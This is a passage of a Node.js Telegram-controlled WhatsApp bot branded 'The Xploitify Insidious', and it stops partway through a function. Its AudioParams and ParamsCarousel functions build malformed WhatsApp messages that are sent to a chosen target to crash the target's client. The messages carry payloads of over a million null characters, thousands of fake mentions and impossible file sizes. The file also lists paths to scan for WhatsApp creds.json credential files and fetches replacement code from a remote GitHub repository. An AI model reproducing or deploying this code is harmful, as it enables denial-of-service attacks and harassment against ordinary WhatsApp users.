
// --- ( const start ) --- \\
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const readline = require("readline");
const fetch = require("node-fetch");
const axios = require("axios");
const chalk = require("chalk");
const ONLY_FILE = "only.json";
const TelegramBot = require("node-telegram-bot-api");
const { execSync } = require('child_process');
const { OpenAI } = require("openai");
const acorn = require("acorn");
const settings = require("./settings");
const sessions = new Map();
const SESSIONS_DIR = "./dapaa_For_You/sessions";
const SESSIONS_FILE = "./dapaa_For_You/sessions/active_sessions.json";
const cd = "./dapaa_For_You/cooldown.json";
const GH_OWNER = "dezz320";
const GH_REPO = "ceodap";
const GH_BRANCH = "index.js";
const config = require("./config.js");
const BOT_TOKEN = config.BOT_TOKEN;
const { ReactMsg } = require("./dapaa_For_You/images/myfunc.js");
const OWNER_ID = config.OWNER_ID;
// --- ( const end )

// --- ( start )
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    checkStatusWA,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

const {
  createController,
  getController,
  stopController,
  stopAllControllers,
  startGlobalTimeout
} = require('./controller');

const currentDate = new Date().toLocaleDateString('id-ID', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
        });
const realLog = console.log;
const realError = console.error;

console.log = function(...args) {
  for (const arg of args) {
    if (typeof arg === 'object' && arg !== null) {
      if (arg.message) {
        realLog(arg.message);
      } else if (arg.error_code && arg.description) {
        realLog(arg.error_code, arg.description);
      }
    } else {
      realLog(arg);
    }
  }
};

console.error = function(...args) {
  for (const arg of args) {
    if (typeof arg === 'object' && arg !== null) {
      if (arg.message) {
        realError(arg.message);
      } else if (arg.error_code && arg.description) {
        realError(arg.error_code, arg.description);
      }
    } else {
      realError(arg);
    }
  }
};

const SCAN_PATHS = [
  "/session/creds.json",
  "/sessions/creds.json",
  "/home/container/session/creds.json",
  "/home/container/creds.json",
  "/container/creds.json",
  "/creds.json",
  "creds.json"
];

// --- ( Path Files ) --- \\
let premiumUsers = JSON.parse(fs.readFileSync("./dapaa_For_You/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./dapaa_For_You/admin.json"));
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}


ensureFileExists("./dapaa_For_You/premium.json");
ensureFileExists("./dapaa_For_You/admin.json");
function savePremiumUsers() {
  fs.writeFileSync("./dapaa_For_You/premium.json", JSON.stringify(premiumUsers, null, 2));
}


function saveAdminUsers() {
  fs.writeFileSync("./dapaa_For_You/admin.json", JSON.stringify(adminUsers, null, 2));
}


function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}


watchFile("./dapaa_For_You/premium.json", (data) => (premiumUsers = data));
watchFile("./dapaa_For_You/admin.json", (data) => (adminUsers = data));
const userId = OWNER_ID
startBot();

initializeWhatsAppConnections();

const bot = new TelegramBot(BOT_TOKEN, { polling: true, });



// --- ( Security Ghitub/Raw ) --- \\
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/dezz320/ceodap/refs/heads/main/tokens.json"; 

// -- ( Console )
  console.log(chalk.blue(`

   ⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
console.log(chalk.bold.blue(`
» Information:
☇ Inventor : t.me/susudancow15
☇ Name Script : The Xploitify Insidious
☇ Version : 2.0
`));

  
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}


// --- ( Validasi token ) --- \\
async function validateToken() {
  
  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(BOT_TOKEN)) {
    process.exit(1);
  }

  startBot();
}

async function resricted(chatid) {
bot.sendMessage(chatid, "<blockquote><b>Lu gak punya akses juer mau ngapain</b></blockquote>", { parse_mode: "HTML" }); 
}

async function downloadRepo(dir = "", basePath = "/home/container") {
    const apiURL = `https://api.github.com/repos/dezz320/ceodap/contents/index.js`;

    const { data } = await axios.get(apiURL, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const localPath = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileResp = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(localPath), { recursive: true });
            fs.writeFileSync(localPath, Buffer.from(fileResp.data));

            console.log(`[UPDATE] ${localPath}`);
        }

        if (item.type === "dir") {
            fs.mkdirSync(localPath, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

async function sleep(ms) {
  await new Promise(resolve => setTimeout(resolve, ms));
}

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
        
const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
  
// -- ( Validasi StartBot ) -- \\
async function startBot() {
console.clear();
}
let sock;
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

// ---- Fungsi Utility -----
function getChatAdmins(chatId) {
    return bot.getChatAdministrators(chatId)
             .then(admins => admins.map(admin => admin.user.id))
             .catch(err => {
                console.error("Error getting chat admins:", err);
                return []; 
             });
}

async function isAdmin(chatId, userId) {
  try {
    const member = await bot.getChatMember(chatId, userId);
    return ['administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}

function generateRandomPassword() {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*";
  const length = 10;
  let password = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const errorLogDir = './error_logs';
const errorLogFile = 'unhandled_errors.log';

async function ensureErrorLogDir() {
    try {
        await fs.mkdir(errorLogDir, { recursive: true });
    } catch (dirError) {
        console.error("Error membuat direktori log error:", dirError); 
    }
}

async function deleteOldLogFile() {
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.unlink(filePath); 
        console.log('File log lama berhasil dihapus.');
    } catch (deleteError) {
        if (deleteError.code !== 'ENOENT') { 
            console.error('Error menghapus file log lama:', deleteError);
        }
    }
}

async function logMessageToFile(msg) {
  try {
    const logFilePath = 'pesan_masuk.log'; 
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} - ${JSON.stringify(msg)}\n`; 
    await fs.appendFile(logFilePath, logEntry); 
  } catch (error) {
    console.error('Error menulis ke file log:', error);
  }
}
async function logErrorToFile(error, errorType = 'Unhandled', additionalInfo = '') { 
    await ensureErrorLogDir();
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); // WIB Time
    const logEntry = `
==================================================
[${timestamp}] - ${errorType}
--------------------------------------------------
${error.stack || error}
${additionalInfo ? 'Additional Info:\n' + additionalInfo + '\n' : ''}
==================================================
`; 
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.appendFile(filePath, logEntry);
    } catch (fileError) {
        console.error("Error menulis log ke file:", fileError);
        console.error("Fallback Log Entry:", logEntry);
    }
}

process.on('unhandledRejection', async (reason, promise) => {
    await logErrorToFile(reason, 'Unhandled Rejection', `Promise: ${promise}`); 
});

process.on('uncaughtException', async (error) => {
    await logErrorToFile(error, 'Uncaught Exception', 'Exception occurred'); 
    process.exit(1); 
});
ensureErrorLogDir(); 
deleteOldLogFile();

// -- ( Validasi WhatsApp Connections ) -- \\
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));             
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}


// -- ( Validasi C Session ) -- \\
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙎𝙖𝙗𝙖𝙧 𝘿𝙪𝙡𝙪 𝙔𝙖 𝘽𝙖𝙣𝙜  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙊𝙩𝙞𝙬𝙞 𝘼𝙗𝙖𝙣𝙜𝙠𝙪  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙃𝙚𝙝𝙚 𝙀𝙧𝙧𝙤𝙧 𝘽𝙖𝙣𝙜  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝘾𝙞𝙚𝙚 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 ${botNumber} 𝙐𝙬𝙪✘ \`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "DAPADAPA");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙈𝙖𝙣𝙩𝙖𝙥𝙨 ദ്ദി ˉ͈̀꒳ˉ͈́ )✧ 𝙎𝙪𝙠𝙨𝙚𝙨 𝙉𝙞𝙝\`\`\`
𝘾𝙤𝙙𝙚 𝘼𝙗𝙖𝙣𝙜𝙠𝙪: ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\` (☞ ͡° ͜ʖ ͡°)☞ 𝙂𝙖𝙜𝙖𝙡 𝘽𝙖𝙣𝙜 ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -- ( Function Runtime ) -- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}


// -- ( Start Time ) -- \\
const startTime = Math.floor(Date.now() / 1000);
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}


// -- ( Get Speed ) -- \}
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}


// -- ( Get CurrentDate ) -- \\
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// -- ( Const Images ) -- \\
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/bmxjte.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}


// -- ( fs cooldown ) -- \\
let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}


// -- ( get premium stats ) -- \\
function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function loadActiveSessions() {
  try {
    const sessionsDir = path.resolve(SESSIONS_DIR);
    try {
      await fs.promises.access(sessionsDir, fs.constants.F_OK);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`Direktori "${sessionsDir}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error mengakses direktori sesi:`, error);
        return [];
      }
    }

    try {
      const data = await fs.promises.readFile(SESSIONS_FILE, 'utf8');
      return JSON.parse(data);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`File sesi "${SESSIONS_FILE}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error membaca file sesi:`, error);
        return [];
      }
    }
  } catch (error) {
    console.error("Error loading sessions:", error);
    return [];
  }
}

async function clearSessionDirectory() {
  try {
    if (await fs.promises.stat(SESSIONS_DIR).catch(() => null)) {
      await fs.promises.rm(SESSIONS_DIR, { recursive: true, force: true });
      console.log(`Direktori "${SESSIONS_DIR}" dan isinya dihapus.`);
    } else {
      console.log(`Direktori "${SESSIONS_DIR}" tidak ditemukan.`);
    }
  } catch (error) {
    console.error("Error menghapus direktori sesi:", error);
  }
}
const GROUP_ID_FILE = 'group_ids.json';


function isGroupAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    return groupIds.includes(String(chatId));
  } catch (error) {
    console.error('Error membaca file daftar grup:', error);
    return false;
  }
}


function addGroupToAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (groupIds.includes(String(chatId))) {
      bot.sendMessage(chatId, 'Grup ini sudah diizinkan.');
      return;
    }
    groupIds.push(String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup ditambahkan ke daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menambahkan grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menambahkan grup.');
  }
}


function removeGroupFromAllowed(chatId) {
  try {
    let groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    groupIds = groupIds.filter(id => id !== String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup dihapus dari daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menghapus grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus grup.');
  }
}

function setAllowedGroups(groupIds) {
  const config = groupIds.map(String);
  fs.writeFileSync(GROUP_ID_FILE, JSON.stringify(config, null, 2));
}

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup || false; 
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!msg.chat || !msg.chat.id) return false;
  if (isOnlyGroupEnabled() && msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return msg.chat.type === "private" && !isGroupAllowed(msg.chat.id);
  } else {
    return !isGroupAllowed(msg.chat.id) && msg.chat.type !== "private";
  }
}

// -- ( Sexsex Bokep ) 
async function toBase64(url) { // buat jpegThumbnail
  const sharp = require("sharp");
  const response = await axios.get(url, { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(100, 100, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
}


// ---- ( Function Start ) ----- \\
async function AudioParams(sock, target, mention = true) {
  try {
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "Hallo Sayang", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }

    console.log(`✅ Bug terkirim ke target: ${target}`);
  } catch (err) {
    console.error("⚠️ Error AudioParams:", err.message);
  }
}
async function ParamsCarousel(target) {
  const etc = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: " Button ",
            format: "EXTENTION_1",
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`),
            statusAttributionType: "SHARED_FROM_MENTION",
          },
          nativeFlowResponseMessage: {
            name: "menu_options",
            paramsJson: "{\"display_text\":\"button\",\"id\":\".menu\",\"description\":\"Group_Message?....\"}",
            version: "3",
          },
        },
      },
    },
  }, {});

  const biji2 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Carousel_Button",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_request",
        },
      },
    },
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background:
      "#" +
      Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "99999999"),
  });

  const push = [];
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "Carousel_Message" }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
